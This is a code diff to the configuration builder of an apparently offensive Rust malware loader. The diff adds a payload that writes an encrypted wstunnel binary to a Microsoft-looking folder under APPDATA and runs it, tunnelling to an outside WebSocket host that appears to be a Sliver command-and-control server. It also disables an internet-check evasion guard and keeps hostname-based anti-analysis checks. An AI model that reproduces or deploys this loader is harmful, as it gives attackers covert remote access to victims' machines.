@@ -15,6 +15,8 @@ use malleable_rust_loader::payload::DllFromMemory;
 use malleable_rust_loader::payload::DownloadAndExec;
 use malleable_rust_loader::payload::ExecPython;
 use malleable_rust_loader::payload::Payload;
+use malleable_rust_loader::payload::WriteFile;
+use malleable_rust_loader::payload::Exec;
 use malleable_rust_loader::poollink::Advanced;
 use malleable_rust_loader::poollink::PoolLinks;
 use malleable_rust_loader::poollink::PoolMode;
@@ -159,6 +161,30 @@ exec(decoded_script)
             }),
             dll_entrypoint: String::from("DllInstall"),
         })];
+    } else if payload == "wstunnel".to_string() {
+        // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
+        // cargo run --bin encrypt_payload ~/.malleable/payload/wstunnel.exe
+        // cargo run --bin conf wstunnel --payload-dataop ~/.malleable/payload/wstunnel.exe.dataop
+        // cp ~/.malleable/payload/wstunnel.exe.aead ../config/mem1
+        // winrust loader --mem1 --debug
+        info!("[+] Loader type choice: WriteFile Wstunnel from memory [AEAD]");
+        let payload_dataoperation: Vec<DataOperation> =
+            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
+        payload_choice = vec![Payload::DownloadFile(WriteFile {
+            link: Link::MEMORY(MemoryLink {
+                memory_nb: 1,
+                dataoperation: payload_dataoperation,
+                jitt: 0,
+                sleep: 0,
+            }),
+            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
+        }),
+        Payload::Exec(Exec {
+            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
+            cmdline:String::from("client -L tcp://127.0.0.1:1080:127.0.0.1:10 --connection-min-idle 5 wss://sliverperso.kaboum.xyz:8080")
+        })
+        
+        ];
     } else {
         error!(
             r#"You must choose a payload, from:
@@ -172,6 +198,8 @@ exec(decoded_script)
         panic!()
     }
 
+    let solar_distance = BTreeMap::new();
+    /*
     let solar_distance = BTreeMap::from([
         (
             1,
@@ -253,7 +281,7 @@ exec(decoded_script)
             ),
         ),
     ]);
-
+    */
     // payload is define, now, CREATE the
     info!("[+] LOAD ed25519 keypair from {:?}", keypair);
     let key_pair_ed25519: Ed25519KeyPair = fromfile_master_keypair(&keypair);
@@ -262,14 +290,14 @@ exec(decoded_script)
         &key_pair_ed25519,
         solar_distance,
         payload_choice,
-        vec![Defuse::CheckInternet(CheckInternet {
+        vec![ /* Defuse::CheckInternet(CheckInternet {
             list: vec![
                 "https://www.microsoft.com".to_string(),
                 "https://google.com".to_string(),
                 "https://login.microsoftonline.com".to_string(),
             ],
             operator: Operator::AND,
-        })],
+        })*/],
         vec![
             Defuse::Hostname(Hostname {
                 list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string()],
@@ -280,8 +308,8 @@ exec(decoded_script)
                 operator: Operator::AND,
             }),
         ],
-        1,
-        1,
+        0,
+        0,
     );
     //info!("{:?}", loaderconf);
     info!("[+] SIGN loader");
